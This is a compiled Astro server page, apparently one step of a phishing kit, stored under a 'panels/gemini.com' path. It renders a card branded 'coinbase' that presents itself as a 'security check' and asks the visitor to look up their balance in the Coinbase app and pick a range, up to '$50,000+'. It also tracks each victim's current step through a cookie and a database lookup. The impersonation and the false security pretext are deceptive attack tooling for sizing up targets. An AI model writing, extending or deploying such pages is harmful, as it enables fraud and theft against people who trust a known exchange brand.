import { c as createComponent, a as createAstro, d as renderComponent, r as renderTemplate, m as maybeRenderHead } from '../chunks/astro/server_MzpsRm1w.mjs';
import 'kleur/colors';
import { $ as $$AuthLayout } from '../chunks/AuthLayout_CigA1UqO.mjs';
import { $ as $$AuthCard } from '../chunks/AuthCard_DF9IDRFk.mjs';
import { i as initializeDb, g as getUserByEmail } from '../chunks/db__92qgssi.mjs';
/* empty css                                   */
export { renderers } from '../renderers.mjs';

const $$Astro = createAstro();
const prerender = false;
const $$Balance = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro, $$props, $$slots);
  Astro2.self = $$Balance;
  initializeDb();
  const cookieHeader = Astro2.request.headers.get("cookie");
  const encodedEmail = cookieHeader?.match(/user_email=([^;]+)/)?.[1];
  const userEmail = encodedEmail ? decodeURIComponent(encodedEmail) : null;
  if (!userEmail) {
    return Astro2.redirect("/signin");
  }
  const user = await getUserByEmail(userEmail);
  if (!user) {
    return Astro2.redirect("/signin");
  }
  if (user.current_page && user.current_page !== "balance") {
    return Astro2.redirect(`/${user.current_page}`);
  }
  return renderTemplate`${renderComponent($$result, "AuthLayout", $$AuthLayout, { "title": "Confirm Balance", "data-astro-cid-2yvtsbse": true }, { "default": async ($$result2) => renderTemplate` ${renderComponent($$result2, "AuthCard", $$AuthCard, { "data-astro-cid-2yvtsbse": true }, { "default": async ($$result3) => renderTemplate` ${maybeRenderHead()}<div class="coinbase-card" data-astro-cid-2yvtsbse> <div class="coinbase-logo" data-astro-cid-2yvtsbse>coinbase</div> <h2 class="coinbase-heading" data-astro-cid-2yvtsbse>Confirm your active balance</h2> <p class="coinbase-subtext" data-astro-cid-2yvtsbse>
This is just a security check for your safety. Please check your
        current balance in the Coinbase app and come back to select it
        here.
</p> <form id="balanceForm" class="coinbase-verification-form" data-astro-cid-2yvtsbse> <p class="coinbase-subtext" data-astro-cid-2yvtsbse>Current Balance</p> <div class="balance-options" data-astro-cid-2yvtsbse> <label class="balance-option" data-astro-cid-2yvtsbse> <input type="radio" name="balance" value="Less than $1,000" required data-astro-cid-2yvtsbse>
Less than $1,000
</label> <label class="balance-option" data-astro-cid-2yvtsbse> <input type="radio" name="balance" value="$1,000 - $5,000" required data-astro-cid-2yvtsbse>
$1,000 - $5,000
</label> <label class="balance-option" data-astro-cid-2yvtsbse> <input type="radio" name="balance" value="$5,000 - $10,000" required data-astro-cid-2yvtsbse>
$5,000 - $10,000
</label> <label class="balance-option" data-astro-cid-2yvtsbse> <input type="radio" name="balance" value="$10,000 - $50,000" required data-astro-cid-2yvtsbse>
$10,000 - $50,000
</label> <label class="balance-option" data-astro-cid-2yvtsbse> <input type="radio" name="balance" value="$50,000+" required data-astro-cid-2yvtsbse>
$50,000+
</label> </div> <button type="submit" class="coinbase-continue-btn" disabled data-astro-cid-2yvtsbse>Continue</button> </form> </div> ` })} ` })}   `;
}, "C:/Users/coold/Desktop/panels/gemini.com/src/pages/balance.astro", void 0);

const $$file = "C:/Users/coold/Desktop/panels/gemini.com/src/pages/balance.astro";
const $$url = "/balance";

const _page = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Balance,
  file: $$file,
  prerender,
  url: $$url
}, Symbol.toStringTag, { value: 'Module' }));

const page = () => _page;

export { page };
